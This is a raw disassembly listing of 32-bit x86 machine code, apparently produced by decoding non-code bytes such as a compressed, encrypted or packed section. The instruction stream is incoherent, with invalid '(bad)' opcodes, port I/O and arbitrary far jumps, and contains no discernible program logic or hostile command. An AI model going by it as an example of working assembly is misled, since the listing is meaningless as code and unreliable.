  426879:	je     0x42682a
  42687b:	in     eax,dx
  42687c:	inc    esi
  42687d:	adc    al,0x15
  42687f:	ds pop ebx
  426881:	add    eax,0xd70a625c
  426886:	mov    eax,ds:0x8cd2a35b
  42688b:	inc    ebx
  42688c:	or     esi,edx
  42688e:	cwde   
  42688f:	jo     0x4268ab
  426891:	stc    
  426892:	or     cl,BYTE PTR [ebx]
  426894:	mov    al,0xa5
  426896:	lock mov bl,0xb9
  426899:	mov    edi,0xe29951c6
  42689e:	jne    0x426889
  4268a0:	mov    edx,0x8188c9cb
  4268a5:	xchg   edx,eax
  4268a6:	sar    DWORD PTR [ebx-0x2fa7fb3c],1
  4268ac:	out    0x24,eax
  4268ae:	inc    esp
  4268af:	jl     0x426914
  4268b1:	jmp    DWORD PTR [esi]
  4268b3:	jge    0x426873
  4268b5:	aas    
  4268b6:	jmp    0x426856
  4268b8:	arpl   ax,bp
  4268ba:	cmc    
  4268bb:	(bad)  
  4268bc:	pop    esi
  4268bd:	pop    ebx
  4268be:	push   0x38
  4268c0:	scas   al,BYTE PTR es:[edi]
  4268c1:	dec    ebx
  4268c2:	icebp  
  4268c3:	dec    esi
  4268c4:	popa   
  4268c5:	stos   BYTE PTR es:[edi],al
  4268c6:	mov    bl,0xe5
  4268c8:	dec    edi
  4268c9:	push   esi
  4268ca:	push   ecx
  4268cb:	dec    eax
  4268cc:	jns    0x42690a
  4268ce:	inc    ebp
  4268cf:	in     eax,0xd8
  4268d1:	mov    ebp,0x140bb41d
  4268d6:	leave  
  4268d7:	out    dx,eax
  4268d8:	mov    ecx,0x2246c463
  4268dd:	cli    
  4268de:	retf   
  4268df:	mov    eax,0x1def4482
  4268e4:	dec    ecx
  4268e5:	popf   
  4268e6:	mov    ebx,0x398985a5
  4268eb:	test   BYTE PTR [edx+ecx*8],ah
  4268ee:	mul    BYTE PTR [ebx-0x4c]
  4268f1:	adc    DWORD PTR [ebx+eax*8],ecx
  4268f4:	nop
  4268f5:	call   DWORD PTR [ebx]
  4268f7:	pop    esi
  4268f8:	jns    0x4268ef
  4268fa:	inc    eax
  4268fb:	aad    0x3f
  4268fd:	jo     0x42690f
  4268ff:	mov    al,BYTE PTR [eax]
  426901:	lods   eax,DWORD PTR ds:[esi]
  426902:	jmp    0x7a5b:0x64d31f93
  426909:	in     al,0xad
  42690b:	loope  0x42689b
  42690d:	dec    ebp
  42690e:	push   0xffffff9b
  426910:	retf   0x7122
  426913:	jnp    0x4268c2
  426915:	pop    esi
  426916:	and    eax,0xe01e8a28
  42691b:	rcl    BYTE PTR [esp+eax*8],0xa0
  42691f:	sbb    bl,BYTE PTR [edx]
  426921:	enter  0x9735,0x1d
  426925:	fadd   QWORD PTR [ecx+edi*8]
  426928:	mov    edi,DWORD PTR fs:[ebx-0x5]
  42692c:	mov    ch,0x74
  42692e:	data16 aaa 
  426930:	fisubr DWORD PTR [esi+0x6b6c1086]
  426936:	and    al,0x3b
  426938:	das    
  426939:	pop    ebx
  42693a:	mov    eax,ds:0x87332e1b
  42693f:	and    BYTE PTR [esi],0x0
	...
  4269b2:	add    BYTE PTR [eax],al
  4269b4:	shl    DWORD PTR [ebx+0x4],0x67
  4269b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269b9:	jcxz   0x4269a3
  4269bc:	jne    0x426978
  4269be:	push   ebp
  4269bf:	inc    esp
  4269c0:	ror    ecx,0x50
  4269c3:	xlat   BYTE PTR ds:[ebx]
  4269c4:	ins    DWORD PTR es:[edi],dx
  4269c5:	call   0x0:0xf50001
  4269cc:	pusha  
  4269cd:	sub    ecx,DWORD PTR [edx+edi*4-0x54f93f81]
  4269d4:	push   ecx
  4269d5:	ins    BYTE PTR es:[edi],dx
  4269d6:	xor    ebp,edi
  4269d8:	sbb    al,0xcd
  4269da:	inc    ebx
  4269db:	xor    BYTE PTR [esi+ebx*1],0x24
  4269df:	int3   
  4269e0:	jmp    DWORD PTR [edx+0x337637ac]
  4269e6:	jae    0x4269f4
  4269e8:	mov    cl,al
  4269ea:	jne    0x426a49
  4269ec:	add    eax,0xe48efa2b
  4269f1:	cmp    al,0x8d
  4269f3:	mov    BYTE PTR [ebp-0x4e],dh
  4269f6:	jl     0x4269ce
  4269f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269f9:	rcr    BYTE PTR [edi],1
  4269fb:	mov    ah,0x2
  4269fd:	sbb    bl,BYTE PTR [ebx]
  4269ff:	daa    
  426a00:	dec    ebp
  426a01:	adc    DWORD PTR [esi-0x5768ff1],ebp
  426a07:	mov    ds:0x22f2486d,al
  426a0c:	retf   0x3547
  426a0f:	mov    ch,0x39
  426a11:	mov    cl,0xfb
  426a13:	mov    ds:0x5632d50d,eax
  426a18:	not    bh
  426a1a:	aam    0xa3
  426a1c:	pop    edx
  426a1d:	shl    DWORD PTR [ebx],cl
  426a1f:	inc    esp
  426a20:	ror    dh,0x5c
  426a23:	sahf   
  426a24:	cmp    eax,0x130b7b55
  426a29:	add    al,0x71
  426a2b:	mov    ebx,edi
  426a2d:	adc    eax,0x9df3c3e6
  426a32:	fsubr  st(4),st
  426a34:	stos   BYTE PTR es:[edi],al
  426a35:	popf   
  426a36:	hlt    
  426a37:	push   ebx
  426a38:	ins    BYTE PTR es:[edi],dx
  426a39:	cmp    al,0x1d
  426a3b:	fwait
  426a3c:	(bad)  
  426a3d:	xchg   ebp,eax
  426a3e:	repnz mov ebx,0x50508bb8
  426a44:	adc    al,0x60
  426a46:	mov    al,ds:0x57955335
  426a4b:	cmp    BYTE PTR [ecx+0x38abe9b],al
  426a51:	dec    ebx
  426a52:	lock fwait
  426a54:	cwde   
  426a55:	sbb    al,0x77
  426a57:	fisub  DWORD PTR [eax-0x19]
  426a5a:	aad    0x74
  426a5c:	cdq    
  426a5d:	push   esp
  426a5e:	mov    eax,DWORD PTR [edi]
  426a60:	pusha  
  426a61:	daa    
  426a62:	and    esi,ecx
  426a64:	sbb    BYTE PTR [edx],bh
  426a66:	imul   ebp,DWORD PTR ds:0x4db5b23,0xffffffc0
  426a6d:	fcomp  QWORD PTR [edi+esi*4+0x67]
  426a71:	jae    0x426a0e
  426a73:	add    DWORD PTR [esi],edx
  426a75:	mov    cl,0x19
  426a77:	push   cs
  426a78:	cmp    eax,0x2e3faa4c
  426a7d:	dec    esp
  426a7e:	nop
  426a7f:	(bad)  
  426a80:	mov    edx,0xeb9645b7
  426a85:	xchg   ecx,eax
  426a86:	jo     0x426a91
  426a88:	in     al,0xc0
  426a8a:	les    esi,FWORD PTR [ebx-0x1c]
  426a8d:	push   0xffffffd3
  426a8f:	hlt    
  426a90:	add    al,0xaa
  426a92:	add    BYTE PTR [ebx-0x57cbf47c],al
  426a98:	imul   ecx,DWORD PTR [ebp-0x2a],0x76839438
  426a9f:	lods   eax,DWORD PTR ds:[esi]
  426aa0:	and    BYTE PTR [ebx-0x28],ah
  426aa3:	outs   dx,DWORD PTR ds:[esi]
  426aa4:	jmp    FWORD PTR [eax]
  426aa6:	ins    BYTE PTR es:[edi],dx
  426aa7:	mov    ah,0xb3
  426aa9:	push   esp
  426aaa:	cmp    al,0x1c
  426aac:	sar    DWORD PTR [ecx+0x7f5ea1bc],1
  426ab2:	xor    BYTE PTR [eax+esi*8],al
  426ab5:	aad    0xf7
  426ab7:	dec    edx
  426ab8:	sub    esp,DWORD PTR [ebp+0x45210fb1]
  426abe:	icebp  
  426abf:	sub    edi,DWORD PTR [edx+0x0]
	...
  426b32:	add    BYTE PTR [eax],al
  426b34:	(bad)  
  426b35:	clc    
  426b36:	jnp    0x426b8e
  426b38:	jg     0x426b11
  426b3a:	in     eax,dx
  426b3b:	cli    
  426b3c:	cwde   
  426b3d:	inc    ebx
  426b3e:	mov    dh,0x90
  426b40:	adc    al,0xac
  426b42:	pusha  
  426b43:	icebp  
  426b44:	bound  ebx,QWORD PTR [ebx+0xf50001]
  426b4a:	add    BYTE PTR [eax],al
  426b4c:	dec    ebp
  426b4d:	xchg   DWORD PTR [ecx+0x7c],ecx
  426b50:	inc    ebx
  426b51:	mov    ds:0xc96f032c,eax
  426b56:	and    al,0xc3
  426b58:	dec    edi
  426b59:	js     0x426b12
  426b5b:	retf   
  426b5c:	pop    ebx
  426b5d:	sub    DWORD PTR [ebx+0x26c614bd],ecx
  426b63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b64:	test   BYTE PTR [eax-0x62],cl
  426b67:	cmp    ecx,DWORD PTR [ebp-0x2b20705]
  426b6d:	(bad)  
  426b6e:	ins    DWORD PTR es:[edi],dx
  426b6f:	out    0xeb,eax
  426b71:	(bad)  
  426b72:	mov    ebp,0x8c36e5e2
  426b77:	adc    eax,0xa68400fe
  426b7c:	inc    si
  426b7e:	int    0xd0
  426b80:	addr16 cdq 
  426b82:	aas    
  426b83:	and    bl,bl
  426b85:	jae    0x426b75
  426b87:	or     DWORD PTR [esi+0x5c],edx
  426b8a:	leave  
  426b8b:	jecxz  0x426b38
  426b8d:	cmp    dl,BYTE PTR [esi]
  426b8f:	cmp    DWORD PTR [edx+eiz*8+0x2cb6bf83],ebp
  426b96:	out    dx,al
  426b97:	pop    esi
  426b98:	cwde   
  426b99:	push   edi
  426b9a:	cmc    
  426b9b:	pop    esi
  426b9c:	xchg   edi,eax
  426b9d:	adc    BYTE PTR ds:0xa6208876,dh
  426ba3:	mov    dl,0x34
  426ba5:	(bad)  
  426ba6:	cmp    DWORD PTR [ecx+edx*2-0x29],0xfffffff3
  426bab:	gs or  dl,cl
  426bae:	pusha  
  426baf:	push   ecx
  426bb0:	or     ch,BYTE PTR [esi+0xe696198]
  426bb6:	stc    
  426bb7:	js     0x426b94
  426bb9:	frstor [esi]
  426bbb:	dec    edx
  426bbc:	adc    eax,0x4856f88d
  426bc1:	add    bl,ah
  426bc3:	push   esi
  426bc4:	fwait
  426bc5:	pop    eax
  426bc6:	inc    edi
  426bc7:	ror    BYTE PTR [ecx-0x36dc8ad1],0x26
  426bce:	and    eax,0x664d8c60
  426bd3:	jnp    0x426bdd
  426bd5:	sub    dh,BYTE PTR [edi]
  426bd7:	pop    eax
  426bd8:	ffreep st(0)
  426bda:	mov    ch,0x48
  426bdc:	daa    
  426bdd:	jo     0x426bcc
  426bdf:	hlt    
  426be0:	bound  edi,QWORD PTR [esi-0xf3a1b2f]
  426be6:	lods   al,BYTE PTR ds:[esi]
  426be7:	or     BYTE PTR [ecx-0x34],0xe0
  426beb:	lods   eax,DWORD PTR ds:[esi]
  426bec:	xor    DWORD PTR [ecx-0x30],esp
  426bef:	xor    cl,BYTE PTR [edi+0x5e]
  426bf2:	ret    0xa956
  426bf5:	call   0x2b52b613
  426bfa:	fsubrp st(5),st
  426bfc:	retf   
  426bfd:	popa   
  426bfe:	push   ds
  426bff:	xor    bl,BYTE PTR [edx+0x5f]
  426c02:	xor    dl,BYTE PTR [edi-0x2a]
  426c05:	mov    edx,edi
  426c07:	retf   
  426c08:	dec    esi
  426c09:	and    dl,bh
  426c0b:	pop    ecx
  426c0c:	sbb    al,0x7a
  426c0e:	outs   dx,BYTE PTR ds:[esi]
  426c0f:	(bad)  
  426c10:	mov    al,ds:0xfa874db
  426c15:	push   eax
  426c16:	hlt    
  426c17:	pop    esi
  426c18:	call   DWORD PTR [edi]
  426c1a:	mov    ch,0x9d
  426c1c:	fwait
  426c1d:	add    BYTE PTR [ecx-0x437561cd],dh
  426c23:	push   ecx
  426c24:	outs   dx,DWORD PTR ds:[esi]
  426c25:	mov    esi,0x3fe6ab05
  426c2a:	pop    ecx
  426c2b:	rcl    BYTE PTR [edx+0x9],cl
  426c2e:	pop    ecx
  426c2f:	jno    0x426c6f
  426c31:	sbb    DWORD PTR [ecx],edx
  426c33:	xchg   ecx,eax
  426c34:	xchg   ebx,eax
  426c35:	sbb    DWORD PTR ds:[bx+si],eax
  426c39:	cmc    
  426c3a:	sbb    DWORD PTR [esi-0x3f8ec2c6],ebp
  426c40:	pop    eax
	...
  426cb1:	add    BYTE PTR [eax],al
  426cb3:	add    bh,bh
  426cb5:	lods   al,BYTE PTR ds:[esi]
  426cb6:	fadd   QWORD PTR [edi]
  426cb8:	fbstp  TBYTE PTR [edi-0x1]
  426cbb:	cld    
  426cbc:	inc    eax
  426cbd:	push   ds
  426cbe:	cdq    
  426cbf:	das    
  426cc0:	inc    esp
  426cc1:	inc    edx
  426cc2:	push   0x8
  426cc4:	push   edi
  426cc5:	pushf  
  426cc6:	add    DWORD PTR [eax],eax
  426cc8:	cmc    
  426cc9:	add    BYTE PTR [eax],al
  426ccb:	add    BYTE PTR [eax+0x1ee209c7],ah
  426cd1:	cmp    al,0x47
  426cd3:	pmullw mm4,QWORD PTR [esi+ecx*4-0x45]
  426cd8:	loopne 0x426d07
  426cda:	ror    ebx,0xf9
  426cdd:	stos   BYTE PTR es:[edi],al
  426cde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426cdf:	int3   
  426ce0:	ins    BYTE PTR es:[edi],dx
  426ce1:	shl    BYTE PTR [eax+0x6426351f],1
  426ce7:	xchg   esp,eax
  426ce8:	jmp    0xbfb568cf
  426ced:	mov    cl,0x87
  426cef:	push   0x1c
  426cf1:	mov    bl,0xba
  426cf3:	pop    ds
  426cf4:	cwde   
  426cf5:	mov    esp,0xaede653c
  426cfa:	mov    ds:0x201bb0cb,eax
  426cff:	push   ebp
  426d00:	dec    ebp
  426d01:	xor    bh,dh
  426d03:	lods   al,BYTE PTR ds:[esi]
  426d04:	cdq    
  426d05:	bound  edx,QWORD PTR [eax]
  426d07:	mov    edx,0x846d5516
  426d0c:	or     dh,BYTE PTR [esp+ebp*2+0x448dd577]
  426d13:	jne    0x426d1f
  426d15:	mov    dl,BYTE PTR [ebx]
  426d17:	ins    DWORD PTR es:[edi],dx
  426d18:	daa    
  426d19:	sub    DWORD PTR [eax+0x1a],ecx
  426d1c:	dec    esp
  426d1d:	xchg   esp,eax
  426d1e:	out    dx,eax
  426d1f:	adc    bl,0xce
  426d22:	repnz mov es,WORD PTR [ebx-0x3a]
  426d26:	iret   
  426d27:	pop    ss
  426d28:	mov    al,0xac
  426d2a:	retf   
  426d2b:	in     eax,0xcb
  426d2d:	pop    ecx
  426d2e:	cwde   
  426d2f:	das    
  426d30:	shl    cl,0xb
  426d33:	fldenv [edi+ebx*4]
  426d36:	(bad)  
  426d37:	in     eax,dx
  426d38:	pop    esi
  426d39:	mov    ecx,0x9d2d28a4
  426d3e:	inc    edx
  426d3f:	ret    0xd4d
  426d42:	iret   
  426d43:	jl     0x426d7d
  426d45:	jmp    0xd072:0xcc69e2b1
  426d4c:	icebp  
  426d4d:	imul   BYTE PTR [edx]
  426d4f:	mov    DWORD PTR [edi],ebp
  426d51:	cli    
  426d52:	not    BYTE PTR [edi-0x6cef95fb]
  426d58:	xchg   ebx,ecx
  426d5a:	sbb    BYTE PTR [ecx-0x25],bl
  426d5d:	idiv   DWORD PTR [ecx-0x4d37c6d1]
  426d63:	add    ch,bh
  426d65:	sub    dh,cl
  426d67:	cmp    al,0x67
  426d69:	rcl    DWORD PTR [edx],1
  426d6b:	dec    esi
  426d6c:	sub    al,BYTE PTR [esi-0x567d7312]
  426d72:	add    bh,ah
  426d74:	mov    ds:0x7860d6dd,eax
  426d79:	loopne 0x426d47
  426d7b:	ret    0x3514
  426d7e:	retf   
  426d7f:	sbb    al,0x1
  426d81:	jae    0x426da5
  426d83:	dec    eax
  426d84:	jne    0x426d56
  426d86:	shr    dl,0x2e
  426d89:	xchg   ebx,eax
  426d8a:	pop    ds
  426d8b:	push   0x6e0b1a2d
  426d90:	xor    DWORD PTR [edx-0x3],0x27cb854e
  426d97:	leave  
  426d98:	adc    eax,0xe2d88696
  426d9d:	xor    DWORD PTR [eax],ebx
  426d9f:	pop    ebp
  426da0:	adc    BYTE PTR ds:0x9be1b72c,0x21
  426da7:	add    DWORD PTR [edx-0x69045959],ebx
  426dad:	sar    DWORD PTR [esp+ebx*8+0x40e79edf],1
  426db4:	icebp  
  426db5:	mov    al,ds:0x95f22060
  426dba:	or     dl,bh
  426dbc:	sbb    BYTE PTR [esi+eax*2],dh
  426dbf:	retf   0xcc
	...
  426e32:	add    BYTE PTR [eax],al
  426e34:	(bad)  
  426e35:	jl     0x426e88
  426e37:	sar    bl,1
  426e39:	std    
  426e3a:	(bad)  
  426e3b:	jle    0x426df9
  426e3d:	(bad)  
  426e3e:	loop   0x426e84
  426e40:	lock mov cl,0xa9
  426e43:	inc    esp
  426e44:	dec    esp
  426e45:	popf   
  426e46:	add    DWORD PTR [eax],eax
  426e48:	cmc    
  426e49:	add    BYTE PTR [eax],al
  426e4b:	add    BYTE PTR [ebx+eiz*2+0x13],al
  426e4f:	(bad)  
  426e50:	enter  0xb744,0x5d
  426e54:	jl     0x426e30
  426e56:	dec    ecx
  426e57:	je     0x426e5c
  426e59:	sbb    cl,cl
  426e5b:	or     BYTE PTR [eax-0x3a],cl
  426e5e:	test   eax,0xc123d3cd
  426e63:	leave  
  426e64:	retf   
  426e65:	(bad)  
  426e66:	xor    eax,0xddd48493
  426e6b:	sub    eax,0x1bd50e91
  426e70:	and    al,0x32
  426e73:	sbb    esi,edi
  426e75:	or     eax,0x72317b63
  426e7a:	scas   eax,DWORD PTR es:[edi]
  426e7b:	or     al,0xba
  426e7d:	add    ch,BYTE PTR [edx-0x15]
  426e80:	scas   eax,DWORD PTR es:[edi]
  426e81:	add    ebx,ecx
  426e83:	mov    cl,0x68
  426e85:	add    bl,ah
  426e87:	mov    cl,0xb3
  426e89:	icebp  
  426e8a:	xor    al,0x47
  426e8c:	xchg   edx,eax
  426e8d:	not    DWORD PTR [esi+0x48]
  426e90:	cmp    edx,DWORD PTR [edi-0x4025b131]
  426e96:	repz xor eax,0x3604ec41
  426e9c:	jns    0x426e61
  426e9e:	push   ecx
  426e9f:	or     BYTE PTR [edx-0x3faccf8c],al
  426ea5:	inc    edi
  426ea6:	ss aas 
  426ea8:	add    DWORD PTR [esi+0x2e875db9],esp
  426eae:	lods   eax,DWORD PTR ds:[esi]
  426eaf:	jmp    0x426e5d
  426eb1:	push   ecx
  426eb2:	add    eax,0x9a37a502
  426eb7:	dec    eax
  426eb8:	dec    ebp
  426eb9:	add    al,0x6
  426ebb:	(bad)  
  426ebc:	sbb    BYTE PTR [esi+0x3b52c75e],dl
  426ec2:	sbb    dh,BYTE PTR [ebx-0x6e]
  426ec5:	push   esp
  426ec6:	sbb    eax,DWORD PTR [ebx+0x60]
  426ec9:	push   cs
  426eca:	stos   BYTE PTR es:[edi],al
  426ecb:	inc    ebx
  426ecc:	or     dl,BYTE PTR [ecx]
  426ece:	retf   0x3cf9
  426ed1:	fs out 0xa0,eax
  426ed4:	sub    bh,BYTE PTR [edi-0x261dc7c2]
  426eda:	imul   edx,DWORD PTR [eax+0x55],0xc1825cc4
  426ee1:	cwde   
  426ee2:	cmp    DWORD PTR [ebx+ecx*8+0x29],esp
  426ee6:	repz icebp 
  426ee8:	adc    dl,BYTE PTR [edi+0x114e3abf]
  426eee:	pop    ebx
  426eef:	adc    bl,BYTE PTR [ebx+0x4f]
  426ef2:	inc    ecx
  426ef3:	addr16 push 0x11b7767e
  426ef9:	or     bh,cl
  426efb:	test   al,0xbf
  426efd:	dec    edx
  426efe:	aam    0x87
  426f00:	fwait
  426f01:	jge    0x426eb9
  426f03:	or     BYTE PTR [esi],ch
  426f05:	daa    
  426f06:	mov    ebp,0x441aca3d
  426f0b:	xchg   ecx,eax
  426f0c:	daa    
  426f0d:	jg     0x426f7c
  426f0f:	les    edi,FWORD PTR [ebx]
  426f11:	shl    ch,0x8a
  426f14:	jmp    0xeb93339b
  426f19:	cs mov bh,0x17
  426f1c:	(bad)  
  426f1e:	pop    esp
  426f1f:	dec    eax
  426f20:	loop   0x426ef2
  426f22:	xor    DWORD PTR [ebx+ecx*8],ecx
  426f25:	out    0x8b,eax
  426f27:	fs cld 
  426f29:	aas    
  426f2a:	or     bh,dh
  426f2c:	jmp    0x426f47
  426f2e:	sub    ah,BYTE PTR [edx+esi*1]
  426f31:	test   eax,0xdcaa6193
  426f36:	or     esp,edx
  426f38:	or     eax,0xc1154c36
  426f3d:	sbb    ah,al
  426f3f:	sldt   WORD PTR gs:[eax]
	...
  426fb3:	add    BYTE PTR [ecx],bh
  426fb5:	cwde   
  426fb6:	or     eax,DWORD PTR [esi]
  426fb8:	stos   DWORD PTR es:[edi],eax
  426fb9:	xchg   edi,eax
  426fba:	cmp    eax,0xcc7989bf
  426fbf:	pop    ebx
  426fc0:	rcr    BYTE PTR [ebp-0x61be2fdb],cl
  426fc6:	add    DWORD PTR [eax],eax
  426fc8:	cmc    
  426fc9:	add    BYTE PTR [eax],al
  426fcb:	add    BYTE PTR [esi+0x32d6eecf],dl
  426fd1:	inc    edx
  426fd2:	(bad)  
  426fd3:	(bad)  [ebx-0x61f429b8]
  426fd9:	inc    edx
  426fda:	clc    
  426fdb:	pop    ebp
  426fdc:	pop    ds
  426fdd:	mov    edx,0xc4e49b67
  426fe2:	or     BYTE PTR [edx],bh
  426fe4:	into   
  426fe5:	leave  
  426fe6:	ret    0xfe89
  426fe9:	ror    BYTE PTR [eax],cl
  426feb:	jno    0x426f9c
  426fed:	xchg   DWORD PTR [esi+0x2d93fad9],edx
  426ff3:	inc    ecx
  426ff4:	jmp    0x48448356
  426ff9:	xchg   edi,eax
  426ffa:	or     dl,al
  426ffc:	sub    eax,0x530a84c7
  427001:	mov    dl,0x5e
  427003:	xchg   esp,eax
  427004:	or     al,0x47
  427006:	gs ds pop es
  427009:	add    eax,0x9706580e
  42700e:	stc    
  42700f:	pop    edi
  427010:	push   es
  427011:	cmp    BYTE PTR [esi],cl
  427013:	mov    ebp,esp
  427015:	test   al,0xa4
  427017:	cmp    eax,0xdc75c752
  42701c:	cwde   
  42701d:	int3   
  42701e:	mov    dh,BYTE PTR [edi+0xa0b8f2]
  427024:	jecxz  0x427021
  427026:	dec    BYTE PTR [ebp-0x37955dc1]
  42702c:	outs   dx,BYTE PTR ds:[esi]
  42702d:	aad    0xb0
  42702f:	mov    ds:0x4ac97c10,eax
  427034:	jo     0x427058
  427036:	pop    ecx
  427037:	lahf   
  427038:	inc    ecx
  427039:	out    dx,al
  42703a:	mov    ebp,0x60a24bfa
  42703f:	ror    BYTE PTR [edx],1
  427041:	mov    eax,ds:0x4ead175e
  427046:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427047:	push   ebx
  427048:	add    eax,0x8b574369
  42704d:	jo     0x4270bf
  42704f:	aam    0xab
  427051:	into   
  427052:	(bad)  
  427053:	pop    esp
  427054:	nop
  427055:	std    
  427056:	test   eax,0x855f7965
  42705b:	push   esi
  42705c:	out    0x82,al
  42705e:	dec    ecx
  42705f:	inc    ebx
  427060:	stos   DWORD PTR es:[edi],eax
  427061:	inc    edi
  427062:	mov    ds:0xf60b87a3,al
  427067:	inc    eax
  427068:	cdq    
  427069:	mov    edx,0x2a2424ee
  42706e:	gs dec edx
  427070:	pusha  
  427071:	add    BYTE PTR [ecx],al
  427073:	loopne 0x427005
  427075:	mov    ebx,0xc5d8c239
  42707a:	iret   
  42707b:	in     eax,0xfa
  42707d:	cmp    eax,0xeceb71b1
  427082:	sahf   
  427083:	mov    bh,0x7f
  427085:	mov    edx,0x9f1a9664
  42708a:	scas   al,BYTE PTR es:[edi]
  42708b:	test   DWORD PTR [esi-0x24607fa2],0x6d774ca2
  427095:	stos   BYTE PTR es:[edi],al
  427096:	mov    esi,0x5e9c5178
  42709b:	es loop 0x427062
  42709e:	push   ss
  42709f:	jmp    0x4270c8
  4270a1:	shl    DWORD PTR [ebp-0x622b4a4c],0xe5
  4270a8:	or     ecx,DWORD PTR [esi+0x45]
  4270ab:	call   0x29cf:0x57260a63
  4270b2:	das    
  4270b3:	xor    al,0x47
  4270b5:	lahf   
  4270b6:	and    eax,0x18cb14d
  4270bb:	icebp  
  4270bc:	sub    BYTE PTR [edi],ah
  4270be:	vpshufb xmm0,xmm2,XMMWORD PTR [eax]
	...
  427134:	fwait
  427135:	and    DWORD PTR [edi],ecx
  427137:	popa   
  427138:	mov    edi,0xcefbff6f
  42713d:	aad    0x24
  42713f:	aam    0x45
  427141:	xor    DWORD PTR [edx],eax
  427143:	cmp    DWORD PTR [esi],esi
  427145:	lahf   
  427146:	add    DWORD PTR [eax],eax
  427148:	cmc    
  427149:	add    BYTE PTR [eax],al
  42714b:	add    BYTE PTR [edx-0x3d],bl
  42714e:	fcmovbe st,st(0)
  427150:	jno    0x427139
  427152:	lahf   
  427153:	sub    DWORD PTR [ecx-0x7e499c5],ebx
  427159:	daa    
  42715a:	sbb    al,0x3f
  42715c:	pop    ss
  42715d:	loope  0x427103
  42715f:	scas   al,BYTE PTR es:[edi]
  427160:	fistp  DWORD PTR [esi-0x41]
  427163:	das    
  427164:	popf   
  427165:	out    dx,eax
  427166:	jnp    0x42718d
  427168:	into   
  427169:	adc    dh,BYTE PTR [edx-0x29]
  42716c:	add    al,0x96
  42716e:	adc    eax,0x2b11d66
  427173:	and    eax,0xae0f7096
  427178:	aam    0x71
  42717a:	lods   eax,DWORD PTR ds:[esi]
  42717b:	int3   
  42717c:	mov    al,ds:0x8ae32eae
  427181:	retf   
  427182:	cld    
  427183:	pop    esp
  427184:	test   BYTE PTR [edx+0x77],bl
  427187:	and    ch,BYTE PTR [eax+0x5273a837]
  42718d:	aas    
  42718e:	loop   0x42713d
  427190:	lea    eax,[edi+0x6481d434]
  427196:	mov    ecx,0xd75ed5f6
  42719b:	std    
  42719c:	clc    
  42719d:	cmp    esp,0xffffff8b
  4271a0:	mov    ebp,0x2b435af
  4271a5:	add    edx,DWORD PTR [esi+0x3a]
  4271a8:	outs   dx,BYTE PTR ds:[esi]
  4271a9:	pop    ebp
  4271aa:	in     al,dx
  4271ab:	scas   eax,DWORD PTR es:[edi]
  4271ac:	repnz cmp DWORD PTR ds:0x3e0bee14,edi
  4271b3:	cmp    ch,BYTE PTR [esi+0x423f11dc]
  4271b9:	popf   
  4271ba:	adc    al,0xf3
  4271bc:	repz je 0x42723e
  4271bf:	xor    DWORD PTR [edx+edx*4-0xe8d0360],ebp
  4271c6:	(bad)  
  4271c7:	repz sub esi,0xffffffcc
  4271cb:	mov    al,ds:0x1812e645
  4271d0:	push   edx
  4271d1:	fbstp  TBYTE PTR [edx-0x2d]
  4271d4:	jno    0x427182
  4271d6:	daa    
  4271d7:	gs xchg esp,eax
  4271d9:	xchg   esi,eax
  4271da:	repnz fwait
  4271dc:	ror    BYTE PTR [eax],0x31
  4271df:	sbb    DWORD PTR [ebp+0x74],edx
  4271e2:	mov    al,0x92
  4271e4:	pushf  
  4271e5:	test   BYTE PTR [ebx+0x25],al
  4271e8:	repnz (bad) 
  4271eb:	jo     0x4271f7
  4271ed:	clc    
  4271ee:	adc    eax,0xfd0a5131
  4271f3:	dec    eax
  4271f4:	cmp    DWORD PTR [eax],ecx
  4271f6:	pop    ss
  4271f7:	push   ecx
  4271f8:	lods   al,BYTE PTR ds:[esi]
  4271f9:	xor    eax,0xb50c9c56
  4271fe:	scas   eax,DWORD PTR es:[edi]
  4271ff:	cld    
  427200:	pop    edi
  427201:	es inc esp
  427203:	jl     0x427273
  427205:	push   ecx
  427206:	aad    0x80
  427208:	pop    ebp
  427209:	jb     0x4271f4
  42720b:	lahf   
  42720c:	fiadd  WORD PTR [ebx]
  42720e:	jl     0x427190
  427210:	loope  0x427220
  427212:	cmc    
  427213:	ins    BYTE PTR es:[edi],dx
  427214:	sbb    eax,0x463521fa
  427219:	out    0x9,al
  42721b:	add    esi,0xffffffc5
  42721e:	adc    al,0x74
  427220:	dec    esp
  427221:	sbb    BYTE PTR [edi+0x2f7e452b],bh
  427227:	pause  
  427229:	pusha  
  42722a:	jmp    0x39e86167
  42722f:	aad    0x18
  427231:	out    dx,al
  427232:	imul   edi,DWORD PTR [eax+ebx*8],0x18a22c75
  427239:	mov    bl,0xdb
  42723b:	push   eax
  42723c:	mov    bh,0x22
  42723e:	xchg   esi,eax
  42723f:	mov    ch,0x21
	...
  4272b1:	add    BYTE PTR [eax],al
  4272b3:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  4272b7:	dec    esi
  4272b8:	std    
  4272b9:	out    dx,al
  4272ba:	xlat   BYTE PTR ds:[ebx]
  4272bb:	aas    
  4272bc:	jle    0x427280
  4272be:	ds jmp 0x9cd526bb
  4272c4:	sub    esp,DWORD PTR [eax+0xf50001]
  4272ca:	add    BYTE PTR [eax],al
  4272cc:	ins    BYTE PTR es:[edi],dx
  4272cd:	xchg   edx,eax
  4272ce:	fild   WORD PTR [edi-0x4618afa6]
  4272d4:	cli    
  4272d5:	loopne 0x4272a6
  4272d7:	imul   edi,ebp,0xcc2dd7be
  4272dd:	jns    0x427267
  4272df:	ffree  st(3)
  4272e1:	mov    al,ds:0x7081ee89
  4272e6:	pop    ebp
  4272e7:	pop    ebx
  4272e8:	pop    ds
  4272e9:	mov    edi,esp
  4272eb:	clc    
  4272ec:	mov    dl,0xec
  4272ee:	adc    al,0xf6
  4272f0:	adc    ecx,DWORD PTR [edx]
  4272f2:	ror    edi,0x5a
  4272f5:	inc    esp
  4272f6:	stc    
  4272f7:	test   al,0x14
  4272f9:	imul   ebx,DWORD PTR [eax-0x2fe4c0f0],0x83ae73da
  427303:	das    
  427304:	fdecstp 
  427306:	pop    esp
  427307:	shl    eax,1
  427309:	inc    ebp
  42730a:	jb     0x427324
  42730c:	mov    ebx,0x66877a79
  427311:	adc    al,dl
  427313:	lods   al,BYTE PTR ds:[esi]
  427314:	mov    bh,0xb8
  427316:	inc    ebx
  427317:	mov    ebp,DWORD PTR [edi-0x11]
